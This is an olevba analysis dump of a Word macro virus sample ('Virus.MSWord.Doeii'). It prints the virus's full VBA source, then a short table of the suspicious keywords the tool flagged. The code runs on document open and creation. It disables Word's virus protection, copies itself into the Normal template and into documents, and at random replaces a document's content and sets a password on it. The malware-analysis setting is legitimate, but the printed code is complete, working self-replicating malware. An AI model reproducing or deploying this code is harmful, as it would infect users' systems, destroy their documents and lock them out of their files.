olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Doeii-e997687a1faaf2764a52cb0cabf196296f8dfa95
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Doeii-e997687a1faaf2764a52cb0cabf196296f8dfa95 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
On Error Resume Next
Randomize Timer
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Set Normalcl = NormalTemplate.VBProject.VBComponents(1).codemodule
Set Activecl = ActiveDocument.VBProject.VBComponents(1).codemodule
If Normalcl.countoflines > 0 Then GoTo InfecteerDeHap
viruscode = Activecl.lines(1, Activecl.countoflines)
Normalcl.insertlines 1, viruscode
InfecteerDeHap:
If Activecl.countoflines > 0 Then GoTo Doeii
viruscode = Normalcl.lines(1, Normalcl.countoflines)
Activecl.insertlines 1, viruscode
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, Fileformat:=wdDocument
Doeii:
x = Int(Rnd * 100)
If x = 11 Then MsgBox "w97.LAM by LiFEwiRE [www.shadowvx.org]", , "...::LiFEwiRE::..."
If x = 25 Then ActiveDocument.Content = "LiFEwiRE2000 - www.shadowvx.org": ActiveDocument.Password = "pietje"
With ActiveDocument.VBProject.VBComponents.Item(1).codemodule
.ReplaceLine 39, "Sub ToolsMacro()"
.ReplaceLine 40, "'(c) LiFEwiRE 2000"
.ReplaceLine 42, "Sub ViewVBCode()"
.ReplaceLine 43, "'www.coderz.net - www.shadowvx.org"
End With
'(c) 2OOO by LiFEwiRE... writt3n 4g4inst my phucking 3x-sk3wl... i c4n c0de ring0 p0ly P3 1nf3ct0rs, but w0rd is 4 b3tt3r
't4rg3t in w97... I kn0w this c0d3 w0n't spr34d 0utzide sk3wl, wh0 cares? Th3 b3tt3r!
End Sub

Private Sub Document_new()
Set Normalcl = NormalTemplate.VBProject.VBComponents(1).codemodule
Set Activecl = ActiveDocument.VBProject.VBComponents(1).codemodule
viruscode = Normalcl.lines(1, Normalcl.countoflines)
Activecl.insertlines 1, viruscode
ActiveDocument.Saved = True
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_new        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

